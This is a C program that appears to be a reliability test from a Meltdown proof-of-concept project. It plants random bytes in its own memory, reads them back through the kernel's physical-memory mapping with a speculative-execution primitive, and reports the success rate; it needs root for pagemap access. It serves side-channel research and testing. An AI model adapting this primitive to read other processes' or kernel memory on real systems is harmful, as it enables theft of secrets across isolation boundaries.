#include "meltdown.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(int argc, char *argv[]) {
  size_t scratch[4096];
  meltdown_config_t config;
  size_t offset = DEFAULT_PHYSICAL_OFFSET;
  int progress = 0;
  unsigned char secret1 = 'X', secret2 = 'A';

  if(argc == 2) {
    offset = strtoull(argv[1], NULL, 0);
    printf("\x1b[33;1m[+]\x1b[0m Setting physical offset to 0x%zx\n", offset);
  }
  
  meltdown_init();

  size_t var1 = (size_t)(scratch + 2048);
  size_t var2 = (size_t)(scratch + 2060);
  *(char*)var1 = secret1;

  size_t start1 = virtual_to_physical(var1);
  size_t start2 = virtual_to_physical(var2);
  if (!start1) {
    printf("\x1b[31;1m[!]\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
    exit(1);
  }
  
  srand(time(NULL));

  size_t correct = 0, wrong = 0, failcounter = 0;
  size_t phys1 = physical_to_virtual(start1);
  size_t phys2 = physical_to_virtual(start2);
  while (1) {
    *(volatile unsigned char*)var1 = secret1;
    *(volatile unsigned char*)var2 = secret2;

    int res1 = meltdown_read(phys1);
    int res2 = meltdown_read(phys2);
    if (res1 == secret1 && res2 == secret2) {
      correct++;
    } else if(res1 != 0 || res2 != 0) {
      wrong++;
    } else {
      failcounter++;
      if(failcounter < 1000) {
        continue;
      } else {
        failcounter = 0;
        wrong++;
      }
    }
    printf("\r\x1b[34;1m[%c]\x1b[0m Success rate: %.2f%% (read %zd values)    ", "/-\\|"[(progress++ / 100) % 4], (100.f * (double)correct) / (double)(correct + wrong), correct + wrong);
    fflush(stdout);
    secret1 = (rand() % 255) + 1;
    secret2 = (rand() % 255) + 1;
  }

  // libkdump_cleanup();

  return 0;
}
